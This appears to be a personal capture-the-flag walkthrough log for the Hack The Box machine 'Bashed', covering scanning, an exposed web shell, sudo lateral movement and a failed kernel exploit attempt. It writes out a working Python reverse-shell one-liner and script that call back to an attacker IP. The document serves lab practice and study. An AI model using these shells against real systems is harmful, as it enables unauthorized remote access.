```
#LESSONS LEARNED:
-MAKE SURE TO USE BOTH DIRSEARCH AND GOBUSTER ALWAYS
-FOR LINUX PRIV ESC DO MANUAL ENUMERATION BEFORE USING TOOLS
-USE PEN TEST MONKEY FOR REVERSE SHELLS
-SUDO -U <USER> BASH -I TO GET A SHELL OF A USER
```


```
31Jan2023

15:39
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.10.10.68
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 20:38 EST
Nmap scan report for 10.10.10.68
Host is up (0.28s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```


```
15:41
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.10.10.68:80 -x 400,401,403
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.10.68-80/_23-01-31_20-40-32.txt

Error Log: /root/.dirsearch/logs/errors-23-01-31_20-40-32.log

Target: http://10.10.10.68:80/

[20:40:32] Starting: 
[20:40:46] 200 -    8KB - /about.html
[20:40:59] 200 -    0B  - /config.php
[20:41:00] 200 -    8KB - /contact.html
[20:41:01] 200 -    1KB - /dev/
[20:41:06] 200 -    2KB - /images/
[20:41:06] 200 -    8KB - /index.html
[20:41:08] 200 -    3KB - /js/
[20:41:14] 200 -  939B  - /php/
[20:41:23] 200 -   14B  - /uploads/

- looking at http://10.10.10.68:80/dev/ directory to see whats in there.
```

```
15:51 
- after browsing to file going to enumerate the .php's to see what happens.
- http://10.10.10.68:80/dev
```

![[3 10.10.10.68-dev.png]]

```
15:58
- clicking on the phpbash.php put me in a web shell on the system
```

![[4 www-data web shell.png]]

```
16:02
- going to try to get a reverse shell
- code used 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


- looks like the script broke the webpage.
```

![[5 pentest monkey python reverse shell.png]]

```
16:06
- setting up netcat listener
- upgraded shell
```


![[6 nc & tty shell upgrade.png]]

```
16:22
www-data@bashed:/var/www/html$ sudo -l
sudo -l
- able to possibly sudo su to scriptmanager without a password.
```

![[7 sudo -l NOPASSWD ALL.png]]

```
16:27
sudo -u scriptmanager bash -i 
- laterally moved to scriptmanager who has more privileges than www-data.
- going to look for anything of interest before uploading linpeas for privilege escalation.

```

![[8 sudo -u scriptmanager bash -i.png]]

```
16:32
- cd'ing around was able to find a directory owned by scriptmanager, going to check out to see if able to privilege escalate this way.
```

![[9 scriptmanager ls -lartva.png]]

```
16:35
- test.py & test.txt
```

![[10 test.py & test.txt ls -lartva.png]]


```
17:02
scriptmanager@bashed:/tmp$ cat /proc/version
cat /proc/version
- looking up exploit for this version
```

![[12 cat procversion.png]]

![[13 linux kernel privilege escalation.png]]
 
 ```
 17:05
-Downloaded exploit from exploit db
	 -https://www.exploit-db.com/exploits/download/44298
-compiled on my kali box.
	
```

![[14 44298 exploit-db fail.png]]

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.5", 4321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```



```
Quitting this box my priv esc is not working, thing box is fried. Reset 3 times, fopr some reason my exact python code isnt working like the ones in the videos. I am moving on. total hours spent on box 6 hours.

```